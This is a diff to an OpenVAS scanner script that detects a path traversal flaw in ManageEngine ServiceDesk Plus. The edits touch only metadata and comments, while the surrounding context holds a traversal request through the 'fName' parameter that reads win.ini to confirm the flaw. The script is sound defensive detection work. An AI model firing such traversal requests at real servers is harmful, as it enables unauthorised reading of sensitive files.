@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manage_engine_servicedesk_plus_path_traversal_vuln_oct15.nasl 6183 2017-05-22 09:03:43Z teissa $
+# $Id: gb_manage_engine_servicedesk_plus_path_traversal_vuln_oct15.nasl 11872 2018-10-12 11:22:41Z cfischer $
 #
 # ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:manageengine:servicedesk_plus";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806510");
-  script_version("$Revision: 6183 $");
+  script_version("$Revision: 11872 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-22 11:03:43 +0200 (Mon, 22 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-10-21 13:10:53 +0530 (Wed, 21 Oct 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability");
@@ -48,16 +48,13 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote
   attackers to read arbitrary files and to obtain sensitive information which
-  may lead to further attacks.
-
-  Impact Level: Application");
+  may lead to further attacks.");
 
   script_tag(name:"affected", value:"ManageEngine ServiceDesk Plus version
   9.1 build 9110 and previous versions.");
 
   script_tag(name:"solution", value:"Upgrade to ManageEngine ServiceDesk Plus
-  version 9.1 build 9111 or later.
-  For updates refer to https://www.manageengine.com");
+  version 9.1 build 9111 or later.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38395");
@@ -68,6 +65,7 @@ if(description)
   script_dependencies("gb_ManageEngine_ServiceDesk_Plus_detect.nasl");
   script_mandatory_keys("ManageEngine/ServiceDeskPlus/installed");
   script_require_ports("Services/www", 8080);
+  script_xref(name:"URL", value:"https://www.manageengine.com");
   exit(0);
 }
 
@@ -76,24 +74,16 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-dir = "";
-appPort = "";
-
-## Get the port
 if(!appPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Application Location
 if(!dir = get_app_location(cpe:CPE, port:appPort)){
   exit(0);
 }
 
-##Construct Attack Request
 url = dir + 'workorder/FileDownload.jsp?module=support&fName=..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:appPort, url:url, check_header:TRUE,
    pattern:"; for 16-bit app support",
    extra_check:make_list("[extensions]", "SetupFileName", "DefaultAdmin")))
